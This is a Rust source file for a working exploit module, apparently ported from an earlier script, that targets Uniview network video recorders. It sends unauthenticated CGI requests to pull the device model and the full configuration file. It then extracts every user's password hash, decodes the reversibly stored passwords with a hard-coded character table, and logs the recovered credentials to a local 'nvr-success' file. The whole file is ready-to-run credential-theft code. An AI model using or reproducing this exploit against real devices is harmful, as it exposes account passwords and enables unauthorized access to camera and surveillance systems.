use anyhow::{anyhow, Context, Result};
use reqwest::Client;
use std::collections::HashMap;
use std::fs::OpenOptions;
use std::io::Write;
use quick_xml::events::Event;
use quick_xml::name::QName;
use quick_xml::Reader;

/// Reverses the Uniview custom encoded password
fn decode_pass(encoded: &str) -> String {
    let map: HashMap<&str, &str> = [
        ("77", "1"), ("78", "2"), ("79", "3"), ("72", "4"), ("73", "5"), ("74", "6"),
        ("75", "7"), ("68", "8"), ("69", "9"), ("76", "0"), ("93", "!"), ("60", "@"),
        ("95", "#"), ("88", "$"), ("89", "%"), ("34", "^"), ("90", "&"), ("86", "*"),
        ("84", "("), ("85", ")"), ("81", "-"), ("35", "_"), ("65", "="), ("87", "+"),
        ("83", "/"), ("32", "\\"), ("0", "|"), ("80", ","), ("70", ":"), ("71", ";"),
        ("7", "{"), ("1", "}"), ("82", "."), ("67", "?"), ("64", "<"), ("66", ">"),
        ("2", "~"), ("39", "["), ("33", "]"), ("94", "\""), ("91", "'"), ("28", "`"),
        ("61", "A"), ("62", "B"), ("63", "C"), ("56", "D"), ("57", "E"), ("58", "F"),
        ("59", "G"), ("52", "H"), ("53", "I"), ("54", "J"), ("55", "K"), ("48", "L"),
        ("49", "M"), ("50", "N"), ("51", "O"), ("44", "P"), ("45", "Q"), ("46", "R"),
        ("47", "S"), ("40", "T"), ("41", "U"), ("42", "V"), ("43", "W"), ("36", "X"),
        ("37", "Y"), ("38", "Z"), ("29", "a"), ("30", "b"), ("31", "c"), ("24", "d"),
        ("25", "e"), ("26", "f"), ("27", "g"), ("20", "h"), ("21", "i"), ("22", "j"),
        ("23", "k"), ("16", "l"), ("17", "m"), ("18", "n"), ("19", "o"), ("12", "p"),
        ("13", "q"), ("14", "r"), ("15", "s"), ("8", "t"), ("9", "u"), ("10", "v"),
        ("11", "w"), ("4", "x"), ("5", "y"), ("6", "z"),
    ]
    .iter()
    .cloned()
    .collect();

    encoded
        .split(';')
        .filter_map(|c| if c == "124" { None } else { map.get(c).copied() })
        .collect()
}

pub async fn run(target: &str) -> Result<()> {
    println!("\nUniview NVR remote passwords disclosure!");
    println!("Author: B1t (ported to Rust)\n");

    // Ensure the target has a proper scheme
    let target = if target.starts_with("http://") || target.starts_with("https://") {
        target.to_string()
    } else {
        format!("http://{}", target)
    };

    let client = Client::builder()
        .danger_accept_invalid_certs(true)
        .timeout(std::time::Duration::from_secs(10))
        .build()
        .context("Failed to build HTTP client")?;

    println!("[+] Getting model name and software version...");

    let version_url = format!("{}/cgi-bin/main-cgi?json={{\"cmd\":116}}", target);
    let version_resp = client.get(&version_url).send().await?;
    let version_text = version_resp.text().await?;

    let model = version_text
        .split("szDevName\":\"")
        .nth(1)
        .and_then(|s| s.split('"').next())
        .unwrap_or("Unknown");

    let sw_ver = version_text
        .split("szSoftwareVersion\":\"")
        .nth(1)
        .and_then(|s| s.split('"').next())
        .unwrap_or("Unknown");

    println!("Model: {}", model);
    println!("Software Version: {}", sw_ver);

    let mut log = OpenOptions::new()
        .create(true)
        .append(true)
        .open("nvr-success.txt")
        .context("Unable to open success.txt log file")?;

    writeln!(log, "\n==== Uniview NVR ====").ok();
    writeln!(log, "Target: {}", target).ok();
    writeln!(log, "Model: {}", model).ok();
    writeln!(log, "Software Version: {}", sw_ver).ok();

    println!("\n[+] Getting configuration file...");
    let config_url = format!("{}/cgi-bin/main-cgi?json={{\"cmd\":255,\"szUserName\":\"\",\"u32UserLoginHandle\":8888888888}}", target);
    let config_resp = client.get(&config_url).send().await?;
    let config_text = config_resp.text().await?;

    let mut reader = Reader::from_str(&config_text);
    reader.config_mut().trim_text(true);

    let mut total_users = 0;

    println!("\n[+] Extracting users' hashes and decoding reversible strings:\n");
    println!("User\t\t|\tHash\t\t\t\t\t|\tPassword");
    println!("_____________________________________________________________________________");

    writeln!(log, "\nUser\t\t|\tHash\t\t\t\t\t|\tPassword").ok();
    writeln!(log, "_____________________________________________________________________________").ok();

    loop {
        match reader.read_event() {
            Ok(Event::Empty(ref e)) if e.name() == QName(b"User") => {
                let mut username = String::new();
                let mut userpass = String::new();
                let mut revpass = String::new();

                for attr in e.attributes().flatten() {
                    match attr.key {
                        k if k == QName(b"UserName") => {
                            username = std::str::from_utf8(&attr.value)?.to_string();
                        }
                        k if k == QName(b"UserPass") => {
                            userpass = std::str::from_utf8(&attr.value)?.to_string();
                        }
                        k if k == QName(b"RvsblePass") => {
                            revpass = std::str::from_utf8(&attr.value)?.to_string();
                        }
                        _ => {}
                    }
                }

                let decoded = decode_pass(&revpass);
                println!("{:<12}|\t{:<34}|\t{}", username, userpass, decoded);
                writeln!(log, "{:<12}|\t{:<34}|\t{}", username, userpass, decoded).ok();

                total_users += 1;
            }
            Ok(Event::Eof) => break,
            Err(e) => return Err(anyhow!("XML parse error: {}", e)),
            _ => {}
        }
    }

    println!("\n[+] Number of users found: {}", total_users);
    writeln!(log, "\n[+] Number of users found: {}", total_users).ok();

    println!("\n*Note: 'default' and 'HAUser' users may not be accessible remotely.\n");
    writeln!(log, "*Note: 'default' and 'HAUser' users may not be accessible remotely.\n").ok();

    Ok(())
}
